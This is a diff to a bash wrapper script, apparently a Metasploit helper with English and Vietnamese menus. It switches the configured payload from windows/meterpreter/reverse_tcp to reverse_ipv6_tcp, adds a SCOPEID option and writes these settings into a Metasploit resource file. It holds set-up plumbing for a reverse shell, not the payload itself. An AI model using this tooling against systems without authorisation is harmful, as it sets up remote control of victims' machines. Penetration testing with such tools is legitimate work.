@@ -2,6 +2,7 @@ function defaul_payload_options {
 	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
 	lport="4444"
 	exitfunc="process"
+	scopeid="0"
 }
 function payload_compare {
 lhost_lenght=`echo "$lhost" | awk '{print length}'`
@@ -38,6 +39,9 @@ function set_payload {
 			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
 				echo -e "$red[-]$RESET" $failed_to_validate
 			fi
+		elif [[ "$new_processing_variables" = "scopeid" ]] || [[ "$new_processing_variables" = "SCOPEID" ]] || [[ "$new_processing_variables" = "Scopeid" ]]; then
+			unset scopeid
+			scopeid="$module_set"
 		fi
 }
 function payload1 {
@@ -67,6 +71,14 @@ lport_lenght=`echo $lport | awk '{print length}'`
 	myvar=$myvar$none
 	done
 	lport=$lport$myvar
+unset_value
+scopeid=`echo $scopeid`
+scopeid_lenght=`echo $scopeid | awk '{print length}'`
+	integer=`expr 18 - $scopeid_lenght`			
+	for (( i = 0 ; i < $integer; i++ )) do
+		myvar=$myvar$none
+	done
+	scopeid=$scopeid$myvar
 unset_value
 exitfunc=`echo $exitfunc`
 exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
@@ -106,6 +118,14 @@ lport_lenght=`echo $lport | awk '{print length}'`
 	done
 	lport=$lport$myvar
 unset_value
+scopeid=`echo $scopeid`
+scopeid_lenght=`echo $scopeid | awk '{print length}'`
+	integer=`expr 27 - $scopeid_lenght`			
+	for (( i = 0 ; i < $integer; i++ )) do
+		myvar=$myvar$none
+	done
+	scopeid=$scopeid$myvar
+unset_value
 exitfunc=`echo $exitfunc`
 exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
 	integer=`expr 27 - $exitfunc_lenght`			
@@ -121,26 +141,28 @@ if [ "$language" = "VN" ]; then
 yes="     Có   "
 no="     Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_ipv6_tcp):
 
    Tên            Thiết lập hiện tại    Yêu cầu   Miêu tả
    ----           ----------------      --------  -----------
    EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
    LHOST          $lhost$yes    Địa chỉ lắng nghe.
    LPORT          $lport$yes    Cổng lắng nghe.
+   SCOPEID	  $scopeid$no   ID phạm vi IPv6, được yêu cầu cho các địa chỉ lớp liên kết.
 
 !
 elif [ "$language" = "EN" ]; then
 yes="     yes"
 no="     no "
 cat << !
-Payload options (windows/meterpreter/reverse_tcp):
+Payload options (windows/meterpreter/reverse_ipv6_tcp):
 
    Name           Current Setting       Required  Description
    ----           ---------------       --------  -----------
    EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
    LHOST          $lhost$yes      The listen address.
    LPORT          $lport$yes      The listen port.
+   SCOPEID	  $scopeid$no      The IPv6 Scope ID, required for link-layer addresses.
 
 !
 fi
@@ -150,26 +172,28 @@ if [ "$language" = "VN" ]; then
 yes="   Có  "
 no="   Không "
 cat << !
-Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp):
+Các tùy chọn của tải trọng (windows/meterpreter/reverse_ipv6_tcp):
 
    Tên            Thiết lập hiện tại	       Yêu cầu    Miêu tả
    ----      	  ---------------  	       --------  -----------
    EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
    LHOST          $lhost$yes     Địa chỉ lắng nghe.
    LPORT          $lport$yes     Cổng lắng nghe.
+   SCOPEID	  $scopeid$no   ID phạm vi IPv6, được yêu cầu cho các địa chỉ lớp liên kết.
 
 !
 elif [ "$language" = "EN" ]; then
 yes="   yes"
 no="   no "
 cat << !
-Payload options (windows/meterpreter/reverse_tcp):
+Payload options (windows/meterpreter/reverse_ipv6_tcp):
 
    Name           Current Setting  	       Required  Description
    ----           ---------------  	       --------  -----------
    EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
    LHOST          $lhost$yes      The listen address.
    LPORT          $lport$yes      The listen port.
+   SCOPEID	  $scopeid$no      The IPv6 Scope ID, required for link-layer addresses.
 
 !
 fi
@@ -179,9 +203,10 @@ payload_path_present=`pwd`
 payload_path_rc_file="$payload_path_present/Config"
 rc_file="$payload_path_rc_file/file.rc"
 config_file="$payload_path_present/Config/config"
-	echo "set payload windows/meterpreter/reverse_tcp" >> $rc_file
+	echo "set payload windows/meterpreter/reverse_ipv6_tcp" >> $rc_file
 	echo "set EXITFUNC $exitfunc" >> $rc_file
-	paylo="windows/meterpreter/reverse_tcp"
+	echo "set SCOPEID $scopeid" >> $rc_file
+	paylo="windows/meterpreter/reverse_ipv6_tcp"
 	lhost=$lhost
 	lport=$lport
 }
